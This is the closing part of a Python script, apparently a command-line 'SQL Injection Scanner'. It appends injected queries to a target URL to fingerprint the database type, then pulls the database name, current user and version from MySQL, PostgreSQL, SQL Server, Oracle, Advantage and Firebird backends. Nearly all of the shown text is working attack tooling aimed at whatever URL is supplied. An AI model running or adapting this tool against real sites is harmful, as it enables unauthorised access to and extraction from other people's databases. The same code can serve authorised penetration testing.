            print(f"Error performing MySQL GET request for query '{query}': {e}")

    async def execute_extract_columns_postgre_query(self, dbname, query, result_key):
        print(f"PostgreSQL: Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                data = await response.text()
                print(data)
        except Exception as e:
            print(f"Error performing PostgreSQL POST request for query '{query}': {e}")

    async def execute_extract_columns_microsoftsql_query(self, dbname, query, result_key):
        print(f"Microsoft SQL Server: Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                data = await response.text()
                print(data)
        except Exception as e:
            print(f"Error performing Microsoft SQL Server POST request for query '{query}': {e}")

    async def execute_extract_columns_oracle_query(self, dbname, query, result_key):
        print(f"Oracle: Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                data = await response.text()
                print(data)
        except Exception as e:
            print(f"Error performing Oracle POST request for query '{query}': {e}")

    async def execute_extract_columns_advantage_query(self, dbname, query, result_key):
        print(f"Advantage Database: Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                data = await response.text()
                print(data)
        except Exception as e:
            print(f"Error performing Advantage Database POST request for query '{query}': {e}")

    async def execute_extract_columns_firebird_query(self, dbname, query, result_key):
        print(f"Firebird: Executing query: {query}")

        post_data = {}
        full_url = f'{self.target_url}+{query}'

        try:
            async with self.session.post(full_url, data=post_data) as response:
                data = await response.text()
                print(data)
        except Exception as e:
            print(f"Error performing Firebird POST request for query '{query}': {e}")

    async def run_scanner(self):
        db_type = await self.scan_database_type()

        if db_type:
            self.db_type = db_type
            self.db_name = await self.get_dbname(db_type)

            if self.current_user:
                await self.get_current_user()

            if self.db_name:
                await self.get_version()

        else:
            print(f"Could not find a vulnerability...")

async def main():
    parser = argparse.ArgumentParser(description="SQL Injection Scanner")
    parser.add_argument("-u", "--target_url", help="Target URL", required=True)
    parser.add_argument("-t", "--database_type", help="Database type")
    parser.add_argument("--get_version", action="store_true", help="Get database version")
    parser.add_argument("--get_current_user", action="store_true", help="Get current user")

    args = parser.parse_args()

    scanner = SQLInjectionScanner(args.target_url, args.database_type)

    if args.get_version:
        await scanner.get_version()

    if args.get_current_user:
        await scanner.get_current_user(scanner.db_name)

    await scanner.run_scanner()

if __name__ == "__main__":
    asyncio.run(main())
